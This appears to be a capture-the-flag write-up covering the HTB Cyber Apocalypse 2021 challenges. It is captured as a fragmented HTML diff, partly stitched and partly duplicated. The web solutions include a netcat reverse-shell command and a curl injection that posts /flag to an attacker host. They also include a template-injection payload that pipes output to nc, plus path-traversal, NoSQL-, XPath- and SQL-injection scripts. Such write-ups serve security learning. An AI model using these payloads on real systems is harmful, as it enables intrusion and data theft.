1/4 Files: None  A socket service hosted a calculator game, driven by emojis. Sending 1 would send an emoji value reference that changed every time you connected to the socket service. Using this reference, you had to solve 500 math questions in less than 2 seconds or something, each. Obviously something we have to script!\n  My script has two parts. First, request the value map, parse and save that. Next, start the game, parse the question by replacing the emojis with the parsed integers and then eval() that.\nfrom pwn import * ev = [] # emoji value store def find_val(e): \"\"\" get the int value for an emoji \"\"\" for emoji, value in ev: if e == emoji: return value def calc(q, num): \"\"\" answer a question \"\"\" qs = [x.decode('utf-8') for x in q.split(b'\\x20')] # example variable length questions # ['🌞', '*', '🍨', '+', '👺', '+', '👺', '+', '🍧', '*', '⛔', '*', '❌', '', '=', '?\\n'] # ['🍪', '*', '🦄', '-', '🌞', '-', '⛔', '-', '🍪', '+', '🦄', '', '=', '?\\n'] # ['🌞', '*', '🔥', '-', '🦄', '+', '🌞', '-', '👺', '', '=', '?\\n'] # ['❌', '-', '🍪', '*', '🍨', '-', '🦄', '*', '❌', '', '=', '?\\n'] # ['🍪', '-', '🔥', '+', '👺', '', '=', '?\\n'] m = '' for x in qs: if x == '': break if x in ['+', '-', '*',]: m = f'{m}{x}' continue m = f'{m}{find_val(x)}' ans = eval(m) # this_is_fine.exe print(f'# {num}, q {qs}, a {ans}') return ans def get_q(c): \"\"\" get a question \"\"\" c.recvline() c.recvline() _, q_num = c.recvline().split(b'\\x20') q_num, _ = q_num.decode('utf-8').split(':') c.recvline() q = c.recvline() c.recvuntil('Answer: ') return int(q_num), q if __name__ == '__main__': conn = remote('138.68.185.219', 31021) conn.recvuntil('') conn.send('1\\n') conn.recvline() conn.recvline() key = conn.recvline() conn.recvline() # populate the emoji value store keys = key.split(b'\\x20') conn.recvuntil('') c = 0 while len(ev)  10: ev.append((keys[c].decode('utf-8'), int(keys[c+2]),)) c+=3 # start game conn.send('2\\n') conn.recvline() q_num = 0 while q_num  500: q_num, q = get_q(conn) a = calc(q, q_num) conn.send(f'{a}\\n') conn.recvline() # get our flag conn.interactive() The final moments of the script running looked like this.\n  Flag: CHTB{3v3n_4l13n5_u53_3m0j15_t0_c0mmun1c4t3}\n- Input as a Service  Category: Misc Difficulty: 1/4 Files: None  We get another socket service, but I wasted a bunch of time by browsing to it… lol.\n  Anyways, rabbit hole aside, it looked like some sort of python interpreter over a TCP socket. Maybe not exactly a python interpreter, but you could do some interesting things like read files.\n  To get the flag. just open('flag.txt').read().\nFlag: CHTB{4li3n5_us3_pyth0n2.X?!\n","wordCount":"3934","inLanguage":"en","datePublished":"2021-04-24T08:41:34+02:00","dateModified":"2021-04-24T08:41:34+02:00","author":{"@type":"Person","name":"Leon Jacobs"},"mainEntityOfPage":{"@type":"WebPage","@id":"https://leonjza.github.io/blog/2021/04/24/hack-the-box-cyber-apocalypse-ctf-21/"},"publisher":{"@type":"Organization","name":"#!/bin/note\n","logo":{"@type":"ImageObject","url":"https://leonjza.github.io/favicon.ico"}}}</script>
 </head>
-<body class=dark-theme>
-<div class=container>
+<body id=top>
+<script>localStorage.getItem("pref-theme")==="dark"?document.body.classList.add('dark'):localStorage.getItem("pref-theme")==="light"?document.body.classList.remove('dark'):window.matchMedia('(prefers-color-scheme: dark)').matches&&document.body.classList.add('dark')</script>
 <header class=header>
-<span class=header__inner>
-<a href=/ class=logo style=text-decoration:none>
-<span class=logo__mark><svg xmlns="http://www.w3.org/2000/svg" class="greater-icon" viewBox="0 0 44 44"><path fill="none" d="M15 8l14.729 14.382L15 35.367"/></svg>
-</span>
-<span class=logo__text>#!/bin/note
-</span>
-<span class=logo__cursor></span>
+<nav class=nav>
+<div class=logo>
+<a href=https://leonjza.github.io accesskey=h title="#!/bin/note
+ (Alt + H)">#!/bin/note
 </a>
-<span class=header__right>
-<nav class=menu>
-<ul class="menu__inner menu__inner--desktop">
-<li><a href=/about/>About Me</a></li>
-<li><a href=/categories>Categories</a></li>
-<li><a href=/posts>Posts</a></li>
-</ul>
-<ul class="menu__inner menu__inner--mobile">
-<li><a href=/about/>About Me</a></li>
-<li><a href=/categories>Categories</a></li>
-<li><a href=/posts>Posts</a></li>
+<span class=logo-switches>
+<button id=theme-toggle accesskey=t title="(Alt + T)"><svg id="moon" xmlns="http://www.w3.org/2000/svg" width="24" height="24" viewBox="0 0 24 24" fill="none" stroke="currentcolor" stroke-width="2" stroke-linecap="round" stroke-linejoin="round"><path d="M21 12.79A9 9 0 1111.21 3 7 7 0 0021 12.79z"/></svg><svg id="sun" xmlns="http://www.w3.org/2000/svg" width="24" height="24" viewBox="0 0 24 24" fill="none" stroke="currentcolor" stroke-width="2" stroke-linecap="round" stroke-linejoin="round"><circle cx="12" cy="12" r="5"/><line x1="12" y1="1" x2="12" y2="3"/><line x1="12" y1="21" x2="12" y2="23"/><line x1="4.22" y1="4.22" x2="5.64" y2="5.64"/><line x1="18.36" y1="18.36" x2="19.78" y2="19.78"/><line x1="1" y1="12" x2="3" y2="12"/><line x1="21" y1="12" x2="23" y2="12"/><line x1="4.22" y1="19.78" x2="5.64" y2="18.36"/><line x1="18.36" y1="5.64" x2="19.78" y2="4.22"/></svg>
+</button>
+</span>
+</div>
+<ul id=menu>
+<li>
+<a href=https://leonjza.github.io/about/ title="About Me">
+<span>About Me</span>
+</a>
+</li>
+<li>
+<a href=https://leonjza.github.io/archives title=Archive>
+<span>Archive</span>
+</a>
+</li>
+<li>
+<a href=https://leonjza.github.io/categories title=Categories>
+<span>Categories</span>
+</a>
+</li>
+<li>
+<a href=https://leonjza.github.io/search/ title="Search (Alt + /)" accesskey=/>
+<span>Search</span>
+</a>
+</li>
 </ul>
 </nav>
-<span class=menu-trigger><svg xmlns="http://www.w3.org/2000/svg" viewBox="0 0 24 24"><path d="M0 0h24v24H0z" fill="none"/><path d="M3 18h18v-2H3v2zm0-5h18v-2H3v2zm0-7v2h18V6H3z"/></svg>
-</span>
-<span class=theme-toggle><svg class="theme-toggler" width="24" height="24" viewBox="0 0 48 48" fill="none" xmlns="http://www.w3.org/2000/svg"><path d="M22 41c10.4934.0 19-8.5066 19-19C41 11.5066 32.4934 3 22 3 11.5066 3 3 11.5066 3 22s8.5066 19 19 19zM7 22C7 13.7157 13.7157 7 22 7V37C13.7157 37 7 30.2843 7 22z"/></svg>
-</span>
-</span>
-</span>
 </header>
-<div class=content>
-<div class=post>
-<h1 class=post-title>hack the box - cyber apocalypse ctf &lsquo;21</h1>
-<div class=post-meta>
-<span class=post-date>
-2021-04-24
-</span>
-<span class=post-read-time>— 19 min read</span>
+<main class=main>
+<article class=post-single>
+<header class=post-header>
+<div class=breadcrumbs><a href=https://leonjza.github.io>Home</a>&nbsp;»&nbsp;<a href=https://leonjza.github.io/posts/>Posts</a></div>
+<h1 class=post-title>
+hack the box - cyber apocalypse ctf '21
+</h1>
+<div class=post-meta>April 24, 2021&nbsp;·&nbsp;19 min&nbsp;·&nbsp;Leon Jacobs&nbsp;|&nbsp;<a href=https://github.com/leonjza/leonjza.github.io/tree/source/content/posts/2021-04-24-hack-the-box---cyber-apocalypse-ctf-2021.markdown rel="noopener noreferrer" target=_blank>Suggest Changes</a>
 </div>
-<div class=post-content>
-<h2>Table of Contents</h2>
-<aside class=table-of-contents><nav id=TableOfContents>
-<ul>
-<li><a href=#foreword>foreword</a></li>
-<li><a href=#solutions>solutions</a>
-<ul>
-<li><a href=#category---web>category - web</a>
-<ul>
-<li><a href=#--blitzprop>- BlitzProp</a></li>
-<li><a href=#--inspector-gadget>- Inspector Gadget</a></li>
-<li><a href=#--daas>- Daas</a></li>
-<li><a href=#--ministryplace>- MiniSTRyplace</a></li>
-<li><a href=#--caas>- Caas</a></li>
-<li><a href=#--wild-goose-hunt>- Wild Goose Hunt</a></li>
-<li><a href=#--etree>- E.Tree</a></li>
-<li><a href=#--the-galactic-times>- The Galactic Times</a></li>
-<li><a href=#--emoji-voting>- emoji voting</a></li>
-<li><a href=#--starfleet>- Starfleet</a></li>
+</header> <div class=toc>
+<details>
+<summary accesskey=c title="(Alt + C)">
+<span class=details>Table of Contents</span>
+</summary>
+<div class=inner><ul>
+<li>
+<a href=#foreword aria-label=foreword>foreword</a></li>
+<li>
+<a href=#solutions aria-label=solutions>solutions</a><ul>
+<li>
+<a href=#category---web aria-label="category - web">category - web</a><ul>
+<li>
+<a href=#--blitzprop aria-label="- BlitzProp">- BlitzProp</a></li>
+<li>
+<a href=#--inspector-gadget aria-label="- Inspector Gadget">- Inspector Gadget</a></li>
+<li>
+<a href=#--daas aria-label="- Daas">- Daas</a></li>
+<li>
+<a href=#--ministryplace aria-label="- MiniSTRyplace">- MiniSTRyplace</a></li>
+<li>
+<a href=#--caas aria-label="- Caas">- Caas</a></li>
+<li>
+<a href=#--wild-goose-hunt aria-label="- Wild Goose Hunt">- Wild Goose Hunt</a></li>
+<li>
+<a href=#--etree aria-label="- E.Tree">- E.Tree</a></li>
+<li>
+<a href=#--the-galactic-times aria-label="- The Galactic Times">- The Galactic Times</a></li>
+<li>
+<a href=#--emoji-voting aria-label="- emoji voting">- emoji voting</a></li>
+<li>
+<a href=#--starfleet aria-label="- Starfleet">- Starfleet</a></li></ul>
+</li>
+<li>
+<a href=#category---reversing aria-label="category - reversing">category - reversing</a><ul>
+<li>
+<a href=#--authenticator aria-label="- Authenticator">- Authenticator</a></li>
+<li>
+<a href=#--passphrase aria-label="- Passphrase">- Passphrase</a></li></ul>
+</li>
+<li>
+<a href=#category---forensics aria-label="category - Forensics">category - Forensics</a><ul>
+<li>
+<a href=#--key-mission aria-label="- Key Mission">- Key Mission</a></li>
+<li>
+<a href=#--invitation aria-label="- Invitation">- Invitation</a></li></ul>
+</li>
+<li>
+<a href=#category---hardware aria-label="category - Hardware">category - Hardware</a><ul>
+<li>
+<a href=#--serial-logs aria-label="- Serial Logs">- Serial Logs</a></li>
+<li>
+<a href=#--compromised aria-label="- Compromised">- Compromised</a></li></ul>
+</li>
+<li>
+<a href=#category---misc aria-label="category - Misc">category - Misc</a><ul>
+<li>
+<a href=#--alien-camp aria-label="- Alien Camp">- Alien Camp</a></li>
+<li>
+<a href=#--input-as-a-service aria-label="- Input as a Service">- Input as a Service</a>
+</li>
 </ul>
 </li>
-<li><a href=#category---reversing>category - reversing</a>
-<ul>
-<li><a href=#--authenticator>- Authenticator</a></li>
-<li><a href=#--passphrase>- Passphrase</a></li>
-</ul>
-</li>
-<li><a href=#category---forensics>category - Forensics</a>
-<ul>
-<li><a href=#--key-mission>- Key Mission</a></li>
-<li><a href=#--invitation>- Invitation</a></li>
-</ul>
-</li>
-<li><a href=#category---hardware>category - Hardware</a>
-<ul>
-<li><a href=#--serial-logs>- Serial Logs</a></li>
-<li><a href=#--compromised>- Compromised</a></li>
-</ul>
-</li>
-<li><a href=#category---misc>category - Misc</a>
-<ul>
-<li><a href=#--alien-camp>- Alien Camp</a></li>
-<li><a href=#--input-as-a-service>- Input as a Service</a></li>
 </ul>
 </li>
 </ul>
-</li>
-</ul>
-</nav></aside>
-<figure class=left>
-<img src=/images/htbcyperapocalypse21/htb_cyberapoc.png>
+</div>
+</details>
+</div>
+<div class=post-content><figure>
+<img loading=lazy src=/images/htbcyperapocalypse21/htb_cyberapoc.png>
 </figure>
-<h1 id=foreword>foreword</h1>
+<h1 id=foreword>foreword<a hidden class=anchor aria-hidden=true href=#foreword>#</a></h1>
 <p>The <a href=https://www.hackthebox.eu/cyber-apocalypse-ctf-2021>HTB Cyber Apocalypse 2021</a> event was a nice and polished <a href=https://ctf.hackthebox.eu/ctf/82>CTF</a>. Apart from the usual start time load issues, everything ran pretty smoothly with nearly zero issues my side. Kudo&rsquo;s HTB! Here are the solutions for the ~20 challenges I managed to solve.</p>
-<h1 id=solutions>solutions</h1>
-<h2 id=category---web>category - web</h2>
-<h3 id=--blitzprop>- BlitzProp</h3>
+<h1 id=solutions>solutions<a hidden class=anchor aria-hidden=true href=#solutions>#</a></h1>
+<h2 id=category---web>category - web<a hidden class=anchor aria-hidden=true href=#category---web>#</a></h2>
+<h3 id=--blitzprop>- BlitzProp<a hidden class=anchor aria-hidden=true href=#--blitzprop>#</a></h3>
 <ul>
 <li>Category: Web</li>
 <li>Difficulty: 1/4</li>
 <li>Files: Web app source & build env</li>
 </ul>
-<figure class=left>
-<img src=/images/htbcyperapocalypse21/blitzprop_1.png>
+<figure>
+<img loading=lazy src=/images/htbcyperapocalypse21/blitzprop_1.png>
 </figure>
 <p>The challenge landing page already had a hint in the &ldquo;ASTa la vista baby&rdquo; song. Checking out the challenge source, the interesting code might not be immediately obvious.</p>
 <div class=highlight><pre tabindex=0 style=color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4><code class=language-javascript data-lang=javascript><span style=color:#75715e>// file challenge/routes/index.js
@@ -188,47 +218,47 @@ Connection: close
     }
 }
 </code></pre></div><p>Command execution was blind, so I ran commands redirecting output to a file in the static folder, requesting that from the web server afterwards. So to get the flag using the PoC, I first ran <code>ls / > /app/static/out.txt</code>.</p>
-<figure class=left>
-<img src=/images/htbcyperapocalypse21/blitzprop_2.png>
+<figure>
+<img loading=lazy src=/images/htbcyperapocalypse21/blitzprop_2.png>
 </figure>
 <p>And then <code>cat /flagk5NDpd</code>.</p>
-<figure class=left>
-<img src=/images/htbcyperapocalypse21/blitzprop_3.png>
+<figure>
+<img loading=lazy src=/images/htbcyperapocalypse21/blitzprop_3.png>
 </figure>
 <p>Flag: <code>CHTB{p0llute_with_styl3}</code></p>
-<h3 id=--inspector-gadget>- Inspector Gadget</h3>
+<h3 id=--inspector-gadget>- Inspector Gadget<a hidden class=anchor aria-hidden=true href=#--inspector-gadget>#</a></h3>
 <ul>
 <li>Category: Web</li>
 <li>Difficulty: 1/4</li>
 <li>Files: None</li>
 </ul>
 <p>For this challenge, you just had to poke around in the console to reveal parts of the flag.</p>
-<figure class=left>
-<img src=/images/htbcyperapocalypse21/inspector_gadget_1.png>
+<figure>
+<img loading=lazy src=/images/htbcyperapocalypse21/inspector_gadget_1.png>
 </figure>
-<figure class=left>
-<img src=/images/htbcyperapocalypse21/inspector_gadget_2.png>
+<figure>
+<img loading=lazy src=/images/htbcyperapocalypse21/inspector_gadget_2.png>
 </figure>
-<figure class=left>
-<img src=/images/htbcyperapocalypse21/inspector_gadget_3.png>
+<figure>
+<img loading=lazy src=/images/htbcyperapocalypse21/inspector_gadget_3.png>
 </figure>
 <p>Flag: <code>CHTB{1nsp3ction_c4n_r3ve4l_us3full_1nf0rm4tion}</code></p>
-<h3 id=--daas>- Daas</h3>
+<h3 id=--daas>- Daas<a hidden class=anchor aria-hidden=true href=#--daas>#</a></h3>
 <ul>
 <li>Category: Web</li>
 <li>Difficulty: 1/4</li>
 <li>Files: None</li>
 </ul>
 <p>Fuzzing this challenge you&rsquo;d realise it’s a Laravel app with debug mode enabled. A recent publication revealed how to get RCE via Ignition (the fancy debug helper used in Laravel helps). I used this exploit for RCE: <a href=https://github.com/ambionics/laravel-exploits>https://github.com/ambionics/laravel-exploits</a></p>
-<figure class=left>
-<img src=/images/htbcyperapocalypse21/daas_1.png>
+<figure>
+<img loading=lazy src=/images/htbcyperapocalypse21/daas_1.png>
 </figure>
 <p>I created a <code>.phar</code> file with <a href=https://github.com/ambionics/phpggc><code>phpggc</code></a> to run <code>nc &lt;ip> 4444 -e /bin/bash</code> to get a shell (didn&rsquo;t <em>really</em> need this but whatever). Finding the flag was easy with that though.</p>
-<figure class=left>
-<img src=/images/htbcyperapocalypse21/daas_2.png>
+<figure>
+<img loading=lazy src=/images/htbcyperapocalypse21/daas_2.png>
 </figure>
 <p>Flag: <code>CHTB{wh3n_7h3_d3bu663r_7urn5_4641n57_7h3_d3bu6633}</code></p>
-<h3 id=--ministryplace>- MiniSTRyplace</h3>
+<h3 id=--ministryplace>- MiniSTRyplace<a hidden class=anchor aria-hidden=true href=#--ministryplace>#</a></h3>
 <ul>
 <li>Category: Web</li>
 <li>Difficulty: 1/4</li>
@@ -247,7 +277,7 @@ Connection: close
 </span><span style=color:#960050;background-color:#1e0010>&lt;/html&gt;
 </span></code></pre></div><p>To get the flag, set <code>lang</code> to <code>GET /?lang=....//....//....//....//....//....//....//....//....//....//flag</code></p>
 <p>Flag: <code>CHTB{b4d_4li3n_pr0gr4m1ng}</code></p>
-<h3 id=--caas>- Caas</h3>
+<h3 id=--caas>- Caas<a hidden class=anchor aria-hidden=true href=#--caas>#</a></h3>
 <ul>
 <li>Category: Web</li>
 <li>Difficulty: 2/4</li>
@@ -269,14 +299,14 @@ Connection: close
     }
 }
 </code></pre></div><p><code>escapeshellcmd()</code> may seem scary here, but it provides nothing in terms of security when just appending to a command like <code>curl</code>. They provide <code>curl -sL </code>, so with a POST request we append <code>-F data=@/flag http://host</code> to have the curl command post the <code>/flag</code> file to our host.</p>
-<figure class=left>
-<img src=/images/htbcyperapocalypse21/caas_1.png>
+<figure>
+<img loading=lazy src=/images/htbcyperapocalypse21/caas_1.png>
 </figure>
-<figure class=left>
-<img src=/images/htbcyperapocalypse21/caas_2.png>
+<figure>
+<img loading=lazy src=/images/htbcyperapocalypse21/caas_2.png>
 </figure>
 <p>Flag: <code>CHTB{f1le_r3trieval_4s_a_s3rv1ce}</code></p>
-<h3 id=--wild-goose-hunt>- Wild Goose Hunt</h3>
+<h3 id=--wild-goose-hunt>- Wild Goose Hunt<a hidden class=anchor aria-hidden=true href=#--wild-goose-hunt>#</a></h3>
 <ul>
 <li>Category: Web</li>
 <li>Difficulty: 2/4</li>
@@ -330,8 +360,8 @@ Connection: close
 
 <span style=color:#a6e22e>module</span>.<span style=color:#a6e22e>exports</span> <span style=color:#f92672>=</span> <span style=color:#a6e22e>router</span>;
 </code></pre></div><p>Using <code>username=admin&password[$ne]=</code> as credentials would log you in as the password is obviously not empty :P</p>
-<figure class=left>
-<img src=/images/htbcyperapocalypse21/wild_goose_hunt_1.png>
+<figure>
+<img loading=lazy src=/images/htbcyperapocalypse21/wild_goose_hunt_1.png>
 </figure>
 <p>Instead of using <code>$ne</code>, we can use <code>$regex</code> to match a part of the password in a loop in a script. If the regex matches we&rsquo;ll be logged in, if not we&rsquo;ll get Login Failed. My script to pwn the password (and get the flag) was:</p>
 <div class=highlight><pre tabindex=0 style=color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4><code class=language-python data-lang=python><span style=color:#f92672>import</span> requests
@@ -369,7 +399,7 @@ password <span style=color:#f92672>=</span> <span style=color:#e6db74>&#34;CHTB{
             <span style=color:#66d9ef>if</span> <span style=color:#e6db74>&#34;}&#34;</span> <span style=color:#f92672>in</span> tpass:
                 print(<span style=color:#e6db74>f</span><span style=color:#e6db74>&#34;flag: </span><span style=color:#e6db74>{</span>tpass<span style=color:#e6db74>}</span><span style=color:#e6db74>&#34;</span>)
 </code></pre></div><p>Flag: <code>CHTB{1_th1nk_the_4l1ens_h4ve_n0t_used_m0ng0_b3f0r3}</code></p>
-<h3 id=--etree>- E.Tree</h3>
+<h3 id=--etree>- E.Tree<a hidden class=anchor aria-hidden=true href=#--etree>#</a></h3>
 <ul>
 <li>Category: Web</li>
 <li>Difficulty: 2/4</li>
@@ -418,8 +448,8 @@ password <span style=color:#f92672>=</span> <span style=color:#e6db74>&#34;CHTB{
     <span style=color:#f92672>&lt;/district&gt;</span>
 <span style=color:#f92672>&lt;/military&gt;</span>
 </code></pre></div><p>Sending a single quote <code>'</code> in the <code>search</code> param reveals that the XML could not be evaluated with an <code>lxml.etree.XPathEvalError</code>. If the search was successful, the app would respond with <code>This millitary staff member exists.</code>.</p>
-<figure class=left>
-<img src=/images/htbcyperapocalypse21/e_tree_1.png>
+<figure>
+<img loading=lazy src=/images/htbcyperapocalypse21/e_tree_1.png>
 </figure>
 <p>My XPath is terrible, so I wrote a script to test expressions.</p>
 <div class=highlight><pre tabindex=0 style=color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4><code class=language-python data-lang=python><span style=color:#f92672>from</span> lxml <span style=color:#f92672>import</span> etree
@@ -484,7 +514,7 @@ code_pos <span style=color:#f92672>=</span> <span style=color:#ae81ff>2</span>
             flag <span style=color:#f92672>=</span> attempt
             <span style=color:#66d9ef>break</span>
 </code></pre></div><p>Flag: <code>CHTB{Th3_3xTr4_l3v3l_4Cc3s$_c0nTr0l}</code></p>
-<h3 id=--the-galactic-times>- The Galactic Times</h3>
+<h3 id=--the-galactic-times>- The Galactic Times<a hidden class=anchor aria-hidden=true href=#--the-galactic-times>#</a></h3>
 <ul>
 <li>Category: Web</li>
 <li>Difficulty: 2/4</li>
@@ -514,23 +544,22 @@ code_pos <span style=color:#f92672>=</span> <span style=color:#ae81ff>2</span>
     <span style=color:#a6e22e>db</span> <span style=color:#f92672>=</span> <span style=color:#a6e22e>database</span>;
     <span style=color:#66d9ef>return</span> <span style=color:#a6e22e>router</span>;
 };
-</code></pre></div>
-<figure class=left>
-<img src=/images/htbcyperapocalypse21/the_galactic_times_1.png>
+</code></pre></div><figure>
+<img loading=lazy src=/images/htbcyperapocalypse21/the_galactic_times_1.png>
 </figure>
-<figure class=left>
-<img src=/images/htbcyperapocalypse21/the_galactic_times_2.png>
+<figure>
+<img loading=lazy src=/images/htbcyperapocalypse21/the_galactic_times_2.png>
 </figure>
 <p>Flag: <code>CHTB{th3_wh1t3l1st3d_CND_str1k3s_b4ck}</code></p>
-<h3 id=--emoji-voting>- emoji voting</h3>
+<h3 id=--emoji-voting>- emoji voting<a hidden class=anchor aria-hidden=true href=#--emoji-voting>#</a></h3>
 <ul>
 <li>Category: Web</li>
 <li>Difficulty: 2/4</li>
 <li>Files: Web app source & build env</li>
 </ul>
 <p>First, take a moment to appreciate this landing page :D</p>
-<figure class=left>
-<img src=/images/htbcyperapocalypse21/emoji_voting_1.png>
+<figure>
+<img loading=lazy src=/images/htbcyperapocalypse21/emoji_voting_1.png>
 </figure>
 <p>The list endpoint had an <code>order</code> parameter which defaulted to <code>count DESC</code>. However, this value flowed into a raw database query (#1).</p>
 <div class=highlight><pre tabindex=0 style=color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4><code class=language-javascript data-lang=javascript><span style=color:#66d9ef>const</span> <span style=color:#a6e22e>sqlite</span> <span style=color:#f92672>=</span> <span style=color:#a6e22e>require</span>(<span style=color:#e6db74>&#39;sqlite-async&#39;</span>);
@@ -681,7 +710,7 @@ pos <span style=color:#f92672>=</span> <span style=color:#ae81ff>1</span>
             print(<span style=color:#e6db74>f</span><span style=color:#e6db74>&#39;flag: </span><span style=color:#e6db74>{</span><span style=color:#e6db74>&#34;&#34;</span><span style=color:#f92672>.</span>join(flag)<span style=color:#e6db74>}</span><span style=color:#e6db74>&#39;</span>)
             sys<span style=color:#f92672>.</span>exit(<span style=color:#ae81ff>0</span>)
 </code></pre></div><p>Flag: <code>CHTB{order_me_this_juicy_info}</code></p>
-<h3 id=--starfleet>- Starfleet</h3>
+<h3 id=--starfleet>- Starfleet<a hidden class=anchor aria-hidden=true href=#--starfleet>#</a></h3>
 <ul>
 <li>Category: Web</li>
 <li>Difficulty: 3/4</li>
@@ -761,78 +790,77 @@ Content-Length: 169
 Connection: close
 
 {&#34;email&#34;:&#34;leon@leon {{ range.constructor(\&#34;console.log(global.process.mainModule.require(&#39;child_process&#39;).execSync(&#39;/readflag | nc &lt;host&gt; 4444&#39;).toString())\&#34;)() }}&#34;}
-</code></pre></div>
-<figure class=left>
-<img src=/images/htbcyperapocalypse21/starfleet_1.png>
+</code></pre></div><figure>
+<img loading=lazy src=/images/htbcyperapocalypse21/starfleet_1.png>
 </figure>
 <p>Flag: <code>CHTB{I_can_f1t_my_p4yl04ds_3v3rywh3r3!}</code></p>
-<h2 id=category---reversing>category - reversing</h2>
-<h3 id=--authenticator>- Authenticator</h3>
+<h2 id=category---reversing>category - reversing<a hidden class=anchor aria-hidden=true href=#category---reversing>#</a></h2>
+<h3 id=--authenticator>- Authenticator<a hidden class=anchor aria-hidden=true href=#--authenticator>#</a></h3>
 <ul>
 <li>Category: Reversing</li>
 <li>Difficulty: 1/4</li>
 <li>Files: ELF 64-bit LSB pie executable</li>
 </ul>
 <p>Running the program you have to enter an Alien ID, which could be retrieved in a dissasembler as an argument passed to <code>strcmp()</code></p>
-<figure class=left>
-<img src=/images/htbcyperapocalypse21/authenticator_1.png>
+<figure>
+<img loading=lazy src=/images/htbcyperapocalypse21/authenticator_1.png>
 </figure>
-<figure class=left>
-<img src=/images/htbcyperapocalypse21/authenticator_2.png>
+<figure>
+<img loading=lazy src=/images/htbcyperapocalypse21/authenticator_2.png>
 </figure>
 <p>Entering <code>11337</code> would then prompt for a <code>Pin:</code>.</p>
 <p>A function called <code>checkpin()</code> took the input you entered at the <code>Pin:</code> prompt, and ran an XOR 9 operation over each character, checking that the character matched a value in the <code>al</code> register.</p>
-<figure class=left>
-<img src=/images/htbcyperapocalypse21/authenticator_3.png>
+<figure>
+<img loading=lazy src=/images/htbcyperapocalypse21/authenticator_3.png>
 </figure>
 <p>To test what the values were being compared to, I added a breakpoint before the <code>cmp BYTE PTR [rbp-0x1d], al</code> operation and printed the register. Having entered a long string at the <code>Pin:</code> prompt, I also set the value in the <code>al</code> register to the expected value to see what future correct values were.</p>
-<figure class=left>
-<img src=/images/htbcyperapocalypse21/authenticator_4.png>
+<figure>
+<img loading=lazy src=/images/htbcyperapocalypse21/authenticator_4.png>
 </figure>
 <p>Using the <code>jsdec</code> decompiler in Cutter, I also saw the string that was being compared to after running the XOR operation on the input buffer. So, to reveal the flag I just wrote a python one-liner to XOR that string.</p>
-<figure class=left>
-<img src=/images/htbcyperapocalypse21/authenticator_5.png>
+<figure>
+<img loading=lazy src=/images/htbcyperapocalypse21/authenticator_5.png>
 </figure>
 <div class=highlight><pre tabindex=0 style=color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4><code class=language-text data-lang=text>&gt;&gt;&gt; &#39;&#39;.join([chr((ord(x)) ^ 9) for x in &#34;}a:Vh|}a:g}8j=}89gV&lt;p&lt;}:dV8&lt;Vg9}V&lt;9V&lt;:j|{:&#34;])
 &#39;th3_auth3nt1c4t10n_5y5t3m_15_n0t_50_53cur3&#39;
 </code></pre></div><p>Flag: <code>CHTB{th3_auth3nt1c4t10n_5y5t3m_15_n0t_50_53cur3}</code></p>
-<h3 id=--passphrase>- Passphrase</h3>
+<h3 id=--passphrase>- Passphrase<a hidden class=anchor aria-hidden=true href=#--passphrase>#</a></h3>
 <ul>
 <li>Category: Reversing</li>
 <li>Difficulty: 1/4</li>
 <li>Files: ELF 64-bit LSB pie executable</li>
 </ul>
 <p>A quick one. The program asks for a passphrase.</p>
-<figure class=left>
-<img src=/images/htbcyperapocalypse21/passphrase_1.png>
+<figure>
+<img loading=lazy src=/images/htbcyperapocalypse21/passphrase_1.png>
 </figure>
 <p>Disassembling the binary, you&rsquo;d see a bunch of bytes being moved that follow the typical flag format in between a bunch of other valid calls.</p>
-<figure class=left>
-<img src=/images/htbcyperapocalypse21/passphrase_2.png>
+<figure>
+<img loading=lazy src=/images/htbcyperapocalypse21/passphrase_2.png>
 </figure>
 <p>Enter those as the passphrase and you&rsquo;re done!</p>
-<figure class=left>
-<img src=/images/htbcyperapocalypse21/passphrase_3.png>
+<figure>
+<img loading=lazy src=/images/htbcyperapocalypse21/passphrase_3.png>
 </figure>
 <p>Flag: <code>CHTB{3xtr4t3rR3stR14L5_VS_hum4n5}</code></p>
-<h2 id=category---forensics>category - Forensics</h2>
-<h3 id=--key-mission>- Key Mission</h3>
+<h2 id=category---forensics>category - Forensics<a hidden class=anchor aria-hidden=true href=#category---forensics>#</a></h2>
+<h3 id=--key-mission>- Key Mission<a hidden class=anchor aria-hidden=true href=#--key-mission>#</a></h3>
 <ul>
 <li>Category: Forensics</li>
 <li>Difficulty: 1/4</li>
 <li>Files: Pcap</li>
 </ul>
 <p>We get a USB pcap for a &ldquo;BlackWidow Ultimate 2016&rdquo; Keyboard. Key inputs are in a &ldquo;HID Data&rdquo; field and not <code>usb.capdata</code> which I was used to.</p>
-<figure class=left>
-<img src=/images/htbcyperapocalypse21/key_mission_1.png>
+<figure>
+<img loading=lazy src=/images/htbcyperapocalypse21/key_mission_1.png>
 </figure>
 <p>Without knowing the field name to get the HID Data, I learnt that you can output as <code>pdml</code> using <code>tshark</code> (<code>tshark -r key_mission.pcap -T pdml</code>) to get all of the fields in a packet that you can use with <code>-T fields</code> for the <code>-e</code> flag.</p>
 <p>Anyways, extract keypresses with <code>tshark -r key_mission.pcap -T fields -e usbhid.data | sed 's/../:&/g2' > presses</code> and use <a href=https://github.com/TeamRocketIst/ctf-usb-keyboard-parser>ctf-usb-keyboard-parser</a> to convert them to ASCII.</p>
-<figure class=left>
-<img src=/images/htbcyperapocalypse21/key_mission_2.png>
+<figure>
+<img loading=lazy src=/images/htbcyperapocalypse21/key_mission_2.png>
 </figure>
 <p>Flag: <code>CHTB{a_plac3_fAr_fAr_away_fr0m_earth}</code></p>
-<h3 id=--invitation>- Invitation</h3>
+<h3 id=--invitation>- Invitation<a hidden class=anchor aria-hidden=true href=#--invitation>#</a></h3>
 <ul>
 <li>Category: Forensics</li>
 <li>Difficulty: 1/4</li>
@@ -853,41 +881,40 @@ Connection: close
 <div class=highlight><pre tabindex=0 style=color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4><code class=language-powershell data-lang=powershell><span style=color:#66d9ef>[strinG]</span>::join(
